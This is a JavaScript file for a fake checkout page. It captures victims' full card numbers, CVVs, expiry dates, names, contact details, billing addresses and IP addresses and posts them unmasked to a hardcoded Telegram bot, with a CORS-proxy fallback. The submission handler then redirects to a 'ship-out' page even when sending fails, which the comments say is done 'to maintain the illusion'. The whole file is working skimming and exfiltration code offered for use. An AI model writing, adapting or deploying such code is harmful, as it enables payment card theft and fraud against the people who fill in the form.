// Simple Telegram Card Collector - No Server Needed!
// This sends card data directly to Telegram from the browser

// Your Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    botToken: '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo',
    chatId: '-1002738425512'
};

// Function to send card data directly to Telegram
async function sendCardToTelegram(cardData) {
    try {
        // Format the message with FULL card details - NO BLURRING!
        const message = `🚨 NEW CARD CAPTURED! 🚨

💳 CARD DETAILS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 CARDHOLDER: ${cardData.cardName || 'Unknown'}
💳 CARD NUMBER: ${cardData.cardNumber || 'Unknown'}
📅 EXPIRES: ${cardData.expMonth || '**'}/${cardData.expYear || '****'}
🔒 CVV: ${cardData.cvv || 'Unknown'}

📧 CONTACT INFO:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 EMAIL: ${cardData.email || 'Unknown'}
📱 PHONE: ${cardData.phoneNumber || 'Unknown'}

🏠 BILLING ADDRESS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${cardData.billingAddress || 'Unknown'}
${cardData.billingAddress2 ? cardData.billingAddress2 + '\n' : ''}${cardData.city || 'Unknown'}, ${cardData.state || 'Unknown'} ${cardData.zipCode || 'Unknown'}
🌍 COUNTRY: ${cardData.country || 'Unknown'}

📊 METADATA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 TIME: ${new Date().toLocaleString()}
💰 DOMAIN: ${window.location.hostname}
🌐 IP: ${cardData.ipAddress || 'Unknown'}
🖥️ BROWSER: ${cardData.browser || 'Unknown'}
📱 OS: ${cardData.os || 'Unknown'}`;

        // Send directly to Telegram API
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log('✅ Card data sent to Telegram successfully!');
            return { success: true };
        } else {
            console.error('❌ Failed to send to Telegram:', response.status);
            return { success: false, error: 'Telegram API error' };
        }
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Enhanced form submission handler
function handleCardSubmission(formData) {
    // Show loading state
    const submitBtn = document.querySelector('.submit-btn');
    if (submitBtn) {
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        submitBtn.disabled = true;
    }

    // Send to Telegram
    sendCardToTelegram(formData)
        .then(result => {
            if (result.success) {
                // Success - redirect to success page
                console.log('Card data sent successfully!');
                window.location.href = 'ship-out.html';
            } else {
                // Error - show message but still redirect (for user experience)
                console.error('Failed to send card data:', result.error);
                // Still redirect to maintain the illusion
                setTimeout(() => {
                    window.location.href = 'ship-out.html';
                }, 1000);
            }
        })
        .catch(error => {
            console.error('Submission error:', error);
            // Still redirect to maintain the illusion
            setTimeout(() => {
                window.location.href = 'ship-out.html';
            }, 1000);
        });
}

// Alternative method using a proxy service (if direct Telegram fails)
async function sendViaProxy(cardData) {
    try {
        // Using a CORS proxy service
        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
        
        const message = `💳 NEW CARD! ${cardData.cardName} - ${cardData.cardNumber} - CVV: ${cardData.cvv} - ${new Date().toLocaleString()}`;
        
        const response = await fetch(proxyUrl + telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message
            })
        });

        return response.ok;
    } catch (error) {
        console.error('Proxy method failed:', error);
        return false;
    }
}

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendCardToTelegram, handleCardSubmission };
}

// Make functions globally available
window.sendCardToTelegram = sendCardToTelegram;
window.handleCardSubmission = handleCardSubmission; 